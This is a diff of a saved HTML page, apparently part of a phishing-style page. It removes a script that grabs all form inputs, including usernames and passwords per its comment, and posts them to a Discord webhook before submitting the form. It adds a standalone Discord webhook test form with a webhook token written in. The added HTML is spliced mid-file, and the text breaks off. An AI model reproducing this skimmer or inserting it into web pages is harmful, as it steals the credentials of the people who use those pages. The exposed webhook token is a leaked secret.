@@ -678,46 +678,39 @@
 
 <script type="module" src="./いう_files/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;fdaed8f65dbe49e7941ff12ff81369ec&quot;}" crossorigin="anonymous"></script>
 
-<script>
-document.addEventListener("DOMContentLoaded", () => {
-    // 送信ボタンを取得
-    const btn = document.querySelector('button[type="submit"], button');
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>Discord送信テスト</title>
+</head>
+<body>
 
-    if (btn) {
-        btn.addEventListener("click", async (e) => {
-            // ページの遷移を一時的にストップ
-            e.preventDefault();
+  <form id="discord-form">
+    <input type="text" id="message-input" placeholder="メッセージを入力" required>
+    <button type="submit">送信</button>
+  </form>
 
-            // 画面内の入力欄（ユーザー名・パスワード）を探す
-            const inputs = document.querySelectorAll('input');
-            let data = [];
-            
-            inputs.forEach(input => {
-                if (input.value) {
-                    data.push(`${input.name || input.type || '入力'}: ${input.value}`);
-                }
-            });
+  <script>
+   const WEBHOOK_URL = "https://discord.com/api/webhooks/1541784654326136873/ygFhAT3XQwgSGsnMrn19c-6DFLkYt_TefUumfCvUn9Si_bqgofHhjkPzQZyzgkXlhxu";
+    document.getElementById('discord-form').addEventListener('submit', async (e) => {
+      // ページのリロードを防ぐ（重要）
+      e.preventDefault();
 
-            const webhookUrl = "https://discord.com/api/webhooks/1541784654326136873/ygFhAT3XQwgSGsnMrnl9c-6DFLkYt_TefUumfCvUn9Si_bqgofHhjkPzQZyzgkXlhxuD";
+      const message = document.getElementById('message-input').value;
 
-            // Discordへ送信
-            try {
-                await fetch(webhookUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        content: 【送信結果】\n + data.join("\n")
-                    })
-                });
-            } catch (err) {
-                console.error(err);
-            }
-
-            // 送信完了後に元の処理（フォーム送信）を実行
-            if (btn.form) {
-                btn.form.submit();
-            }
+      try {
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json', // これがないとCORSエラーになることがあります
+          },
+          body: JSON.stringify({
+            content: message // Discordに送るテキスト
+          })
         });
-    }
-});
-</script>
+
+        if (response.ok) {
+          alert('Discordに送信されました！');
+        } else {
+          aler...
